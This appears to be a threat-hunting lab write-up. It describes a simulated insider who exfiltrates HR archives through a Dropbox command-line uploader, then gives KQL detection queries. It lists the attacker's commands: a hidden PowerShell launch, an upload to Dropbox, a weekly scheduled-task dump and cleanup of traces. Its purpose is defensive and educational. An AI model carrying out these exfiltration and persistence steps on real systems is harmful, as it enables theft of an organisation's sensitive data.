# 🔍 Threat Hunt Scenario: Unauthorized Data Exfiltration via Dropbox CLI

## 🧨 Threat Event: Use of Dropbox Command-Line Interface for Stealth File Transfer

---

## 🧠 Steps the "Bad Actor" Took

1. **Downloaded** the Dropbox CLI tool: `https://www.dropbox.com/download?plat=lnx.x86_64`
2. **Silently installed** it using a PowerShell script:
Start-Process "dropbox_uploader.bat" -WindowStyle Hidden

markdown
Copy
Edit
3. **Authenticated** with a personal Dropbox token.
4. **Created** a ZIP archive of sensitive documents:
HR_Q3_Backups.zip in C:\Users\Public\Exports

markdown
Copy
Edit
5. **Uploaded** the archive to Dropbox using:
.\dropbox_uploader.bat upload HR_Q3_Backups.zip /Q3_Dumps/

arduino
Copy
Edit
6. **Scheduled** an automated task to run every Friday at 6 PM using:
schtasks /create /tn "DropboxWeeklyDump" /tr "C:\Tools\dropbox_uploader.bat ..." /sc weekly /d FRI /st 18:00

pgsql
Copy
Edit
7. **Deleted** both the ZIP file and CLI tool post-upload to minimize forensic traceability.

---

## 🧾 Tables Used to Detect IoCs

| Table Name           | Description                                                                                 |
|----------------------|---------------------------------------------------------------------------------------------|
| `DeviceFileEvents`   | Detected `.zip` archive creation and Dropbox tool activity                                  |
| `DeviceProcessEvents`| Logged PowerShell execution, Dropbox CLI usage, and scheduled task creation                |
| `DeviceNetworkEvents`| Monitored outbound connections to `dropbox.com` over port 443                              |

---

## 🧪 Detection Queries

```kusto
// Dropbox CLI tool download
DeviceFileEvents
| where FileName has "dropbox"
```
```kusto
// PowerShell script with hidden install
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine has_all("Start-Process", "Hidden")
| project Timestamp, DeviceName, ProcessCommandLine
```
```kusto
// Dropbox CLI upload execution
DeviceProcessEvents
| where ProcessCommandLine has_all("dropbox_uploader", "upload")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
```kusto
// ZIP file creation
DeviceFileEvents
| where FileName endswith ".zip"
| where FolderPath has "Exports"
| project Timestamp, FileName, FolderPath, ActionType
```
```kusto
// Dropbox network activity
DeviceNetworkEvents
| where RemoteUrl has "dropbox.com"
| where RemotePort == 443
| project Timestamp, DeviceName, RemoteIP, RemoteUrl
```
```kusto
// Scheduled task creation
DeviceProcessEvents
| where ProcessCommandLine has "schtasks"
| where ProcessCommandLine has_any("Friday", "18:00")
| project Timestamp, DeviceName, ProcessCommandLine
```

## ✅ Summary

This scenario simulated an insider using Dropbox's CLI to quietly exfiltrate sensitive data outside of the corporate environment. Despite using a legitimate tool, the combination of command-line automation, ZIP creation, scheduled execution, and post-operation cleanup behavior reveals suspicious activity that defenders must be ready to detect.

---

**Created By**  
**Author:** Giuseppe Scalzo  
**Date:** June 1, 2025
